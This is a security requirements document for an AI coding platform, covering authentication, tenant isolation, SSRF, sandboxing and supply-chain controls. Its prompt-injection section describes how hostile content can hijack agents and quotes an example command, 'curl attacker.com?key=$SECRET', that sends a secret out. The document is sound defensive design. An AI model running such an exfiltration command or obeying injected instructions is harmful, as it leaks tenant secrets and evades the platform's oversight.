# SECURITY.md — Security Requirements & Controls

Status: **v1 requirements baseline (M0).** These are binding requirements for all subsequent milestones. Where a control is not yet implemented, it is scheduled in [ROADMAP.md](./ROADMAP.md) and CI must not gate it off. This document describes *required* behavior; verification of implementation happens via [TESTING.md](./TESTING.md) security test suites.

## 0. Security posture

- **Assume breach / defense-in-depth:** no single check is the only barrier between an attacker and tenant data.
- **Least privilege everywhere:** service tokens, DB roles, sandbox capabilities, and API scopes each get the minimum required.
- **Untrusted by default:** user input, AI output, generated code, webhook payloads, and provider responses are all hostile until validated.
- **No security through obscurity:** our architecture docs are internal but not secret; real controls are the boundary.

## 1. Authentication

- Passwords: argon2id (memory-hard), per-user salt; forced re-hash on login if parameters lag. No password length/complexity theater beyond min 12 chars; breach-list check (HaveIBeenPwned-style k-anonymity) at signup.
- Sessions: HttpOnly + Secure + SameSite=Lax cookies; idle timeout ≤ 14 days with absolute cap; refresh-token rotation with reuse detection (revoke family). Session listing + remote logout per user.
- OAuth: state + PKCE mandatory; account-linking requires verified email match or explicit link flow; never auto-create accounts from unverified IdP emails.
- MFA: TOTP support required before GA (roadmap M6+); enforced for admin roles.
- PAT/API keys: stored hashed (SHA-256), prefixed (`fp_`), scoped, expiring by default, last-used tracking, one-time plaintext display.
- Credential stuffing: rate limit + progressive CAPTCHA/turnstile on auth endpoints (see §6).

## 2. Authorization & tenant isolation

- Model: RBAC per organization (`owner/admin/member/viewer`) + resource-level checks in services. All decisions via central `PolicyService`; controllers/guards may not hand-roll role logic.
- **Tenant scoping rule:** every query for tenant-owned data must carry `tenant_id` derived *only* from authenticated session membership — never from request bodies/params/query strings. Repositories enforce this structurally (scoped base class), not by convention per call-site.
- Defense-in-depth: PostgreSQL Row-Level Security policies keyed on `SET app.tenant_id` for all tenant tables (from M2 onward).
- Object access: file/preview/artifact URLs use short-lived signed tokens bound to `(tenantId, resourceId)`; IDOR tests in CI (§ see TESTING.md).
- Admin actions: platform staff access requires separate break-glass flow, MFA, and audit events; no standing superuser cookie.
- Cross-tenant enumeration resistance: opaque UUIDv7 IDs (no sequential leak), cursor pagination without count disclosure.

## 3. Secrets management

- **Never commit secrets.** `.gitignore` covers `.env*` except `.env.example`. Pre-commit hook + CI scan (gitleaks) block leaks; history scanning on any suspected exposure + immediate rotation runbook.
- Runtime config strictly via environment variables validated at boot (`packages/shared/env` zod schema: fail-fast, missing secret ⇒ process refuses to start). `.env.example` contains placeholders only — real values live in a secret manager (Vault/Cloud SM behind `SecretsPort`).
- Provider API keys (OpenAI/Anthropic/Qwen): stored encrypted at rest (envelope encryption, KMS-managed DEK), readable only by `gateway`; never logged, never returned by any API response (masked `sk-…abcd` form only).
- BYOK keys (when feature ships): same storage class as platform keys; per-tenant encryption context.
- Rotation: documented quarterly rotation for platform credentials; instant revocation path for leaked keys (config reload without deploy).
- JWT signing keys: asymmetric (EdDSA/RS256), key IDs in header, rotation supported, private keys never leave secret manager.
- Logging redaction: pino serializers strip `authorization`, `cookie`, `password`, `apiKey`, provider key env names; tests assert redaction works.

## 4. Transport & data protection

- TLS 1.2+ everywhere (terminate at edge; internal hops TLS where cross-host). HSTS preload on product domains.
- Encryption at rest: database volumes, object storage (SSE-KMS), backups. Application-layer encryption for provider keys and other high-sensitivity fields.
- Webhooks (billing, OAuth providers): signature verification mandatory before processing; replay window bounded; idempotent handlers keyed on delivery ID.
- CORS: explicit allowlist of first-party origins; credentials mode never wildcarded.
- Cookies scope: domain-minimal, `__Host-` prefix where feasible.

## 5. SSRF protection (critical: we fetch URLs users/prompts provide)

- All outbound fetches (`web.fetch` tool, URL imports, preview probes, webhook receivers) go through a central `SafeFetchService`:
  - resolve DNS first, reject results resolving to RFC1918/loopback/link-local/metadata ranges (169.254.169.254 etc.), re-check after redirect hop-by-hop;
  - scheme allowlist http/https only; no credential-bearing redirects;
  - egress via proxy with domain allowlist for agent-initiated fetches; size/time limits; per-tenant quotas.
- Preview proxy: sandbox endpoints reachable only via platform proxy; proxy binds fixed upstream registry (sandbox ID→endpoint), never caller-supplied hostnames.
- DNS rebinding: TOCTOU mitigated by connecting to the validated IP (pinning), not re-resolving.

## 6. Rate limiting & abuse prevention

- Layered: edge (CDN/WAF) → api gateway guards (Redis sliding-window) → per-queue concurrency caps → per-provider outbound budgets.
- Defaults (tunable per plan): anonymous auth endpoints 10/min/IP; authenticated writes 60/min/user; agent-run starts 20/min/tenant; gateway tokens/min/tenant by plan; expensive operations (builds, exports) additionally token-bucketed.
- Abuse signals: new-account velocity, credit-exhaustion churn, prompt patterns targeting scraping/crypto-mining phrasing ⇒ flag to moderation queue, auto-throttle at thresholds.
- Cost guardrails: hard per-tenant daily credit ceiling; circuit on anomalous spend; global provider budget kill-switch (admin).
- Email/SMS sending: capped per account/IP; verified-email gating before generation-heavy features.

## 7. Prompt injection & LLM-specific risks

Threat: user prompts, project file contents, fetched web pages, and tool outputs may carry adversarial instructions hijacking agents.

Controls (design commitments, implemented from M3+):
1. **Privilege outside the model:** LLM output is *intent*, never authority. Tool execution layer independently enforces allowlists, permission classes, and confirmation gates regardless of what the model "says."
2. **Context layering:** system policy vs. user data vs. third-party content delimited and labeled; retrieved/file content rendered as data blocks with instruction-following suppressed (dual-LLM pattern for high-risk tools: cheap filter model vets external content before main agent sees it).
3. **Data exfil channels closed:** agents cannot read platform secrets/provider keys; `fs` tools jailed to project tree; `shell.exec` jailed to sandbox; egress allowlisted (§5) so injected "curl attacker.com?key=$SECRET" fails at network layer even if executed.
4. **Output handling:** generated code scanned for obvious exfil/backdoor patterns (secret paths, obfuscated eval fetching remote payloads) before preview; flagged diffs require human accept.
5. **Model content safety:** provider moderation flags surfaced; jailbreak-attempt telemetry per tenant feeds abuse scoring (§6).
6. **Red-teaming:** injection test corpus runs against agent pipeline in staging before each release (TESTING.md §security tests).

## 8. Command execution & sandbox isolation

- Generated/user code executes **only** inside sandboxes (ARCHITECTURE §10). Platform processes never `child_process` user-controlled strings.
- Container hardening baseline: non-root user, `no-new-privileges`, dropped ALL capabilities, seccomp runtime profile, read-only root overlay + tmpfs workdir, cgroup CPU/mem/pids/disk quotas, all Linux namespaces isolated, no docker socket, no host mounts.
- Network: default-deny; only platform proxy + allowlisted package registries reachable; inter-sandbox traffic blocked (so compromised sandbox can't pivot to other tenants).
- Filesystem sync both directions passes through a sanitizing bridge (path canonicalization, symlink escape rejection, inode/size caps, tar extraction hardened against traversal/"slipstream").
- Escalation tier decision (microVM: Firecracker/gVisor) tracked in PROJECT.md §8 — container baseline acceptable for private beta only with above controls; production GA requires isolation review sign-off.
- Sandbox-to-platform auth: run-scoped tokens with TTL ≤ run lifetime; zero standing credentials in images.

## 9. Dependency security & supply chain

- Package manager: pnpm with lockfile committed; CI installs `--frozen-lockfile`; no `npm install` during builds.
- Renovate for updates; `pnpm dedupe` + minimal dependency footprint policy (new deps need justification + owner in PR).
- Scanning: `pnpm audit`/OSV (high/critical block merge), Trivy image scans, SBOM generated per build (CycloneDX), provenance recorded.
- Lockfile hygiene: `package-manager` field + provenance attestations checked; postinstall scripts disabled unless explicitly approved per-package (`onlyBuiltDependencies` allowlist).
- Base images pinned by digest; distroless where possible; rebuild cadence ≤ monthly for CVE freshness.
- Vendor binaries (e.g., template CLIs) fetched only from official sources, checksum-pinned.

## 10. Audit logging

- Append-only `audit_events(tenant_id, actor{user|service|agent}, action, resource, ip, ua, trace_id, created_at, payload_hash)`; retained ≥ 1 year; exportable per tenant.
- Mandatory events: auth (login/logout/failed/MFA changes), membership/role changes, project create/delete/export, file delete batches, git history operations, billing changes, admin/break-glass access, provider-key CRUD, router override pins, quota overrides.
- Audit writes fail-closed for privileged operations (if audit insert fails, the operation aborts).
- Agent activity is fully audited: every tool invocation with args hash + result status — supports incident reconstruction ("what did the AI do").

## 11. Secure file handling

- Uploads/imports: max sizes, MIME sniffing (not trusting extensions), archive extraction hardened (entry-count/total-size/decompression-ratio caps, absolute-path/symlink rejection), virus scanning for user uploads before persistence (ClamAV adapter, provisional).
- Project files: path canonicalization + workspace-root confinement on every fs operation; hidden `.git` internals not writable via API.
- Downloads/previews: Content-Disposition safe headers; HTML served from previews always CSP-sandboxed and cookie-less origin (§Preview).
- Deletion: GDPR-style erasure cascades (DB rows, blobs, git objects GC, cache invalidation) with tombstones + job-driven purge; backup expiry documented.

## 12. Input validation & secure coding baseline

- zod schemas at every boundary (HTTP DTOs, queue payloads, webhook bodies, provider responses, env vars). Unknown fields rejected on security-sensitive inputs.
- No raw SQL string interpolation ever (parameterized/Drizzle only); no `eval`/`Function` anywhere; template-literal HTML avoided (React escaping; `dangerouslySetInnerHTML` forbidden without review).
- AuthZ check co-located with data fetch (policy filter in repository calls, not just controller decorator) to prevent "forgot the guard" classes of bugs.
- Error responses: generic codes/messages externally; details only in server logs correlated by traceId. Stack traces never serialized to clients.

## 13. Privacy & data governance

- Data inventory maintained as schema evolves (which fields are PII/provider-content). Prompts/completions retention policy decided before GA (PROJECT.md §8.5); default: transient completion bodies purged ≤ 30 days, metadata kept for billing.
- Tenant data export + deletion self-service before GA. DPA-ready subprocessor list (providers named per tenant routing!). Note: provider independence has a privacy consequence — which vendor processed a prompt is recorded per usage event for transparency.
- Backups encrypted, access-audited, region-pinned; restore drills quarterly.

## 14. Operational security checklist (per milestone)

Before any environment reaches "real users": secret scan green · SAST/Lint security rules green · pen-test of authn/z + tenant isolation + SSRF + sandbox escape attempted (internal red team) · rate limits load-verified · audit stream sampled & correct · runbooks for key compromise & tenant-isolation incident exist and were walked.

## 15. Threat model summary (v1, simplified STRIDE)

| Asset | Primary threats | Key controls |
|---|---|---|
| Tenant data | IDOR, broken scope, dump via API | §2 isolation, RLS, signed URLs, tests |
| Provider keys / platform secrets | leak via logs/errors/prompts | §3 encryption, redaction, gateway-only access |
| Platform compute | malicious generated code | §8 sandbox, quotas, egress deny |
| Billing integrity | credit theft, runaway spend | §14 pre-flight checks, ceilings, reconciliation |
| Model pipeline | prompt injection, exfil | §7 layered trust, network jail |
| Availability | abuse floods, provider outage | §6 rate limits, router failover |

This table is the index for security regression tests; each row maps to suites named in TESTING.md.
